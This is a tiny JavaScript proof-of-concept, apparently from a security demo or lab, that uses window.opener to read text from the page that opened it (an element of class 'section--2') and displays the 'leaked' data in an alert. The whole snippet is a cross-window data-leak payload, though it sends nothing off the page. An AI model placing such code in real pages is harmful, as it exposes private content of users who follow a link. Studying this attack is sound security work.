window.opener.onload = x => {



    var leakedData = window.opener.document.getElementsByClassName("section--2")[0].innerText
    alert(leakedData)



}



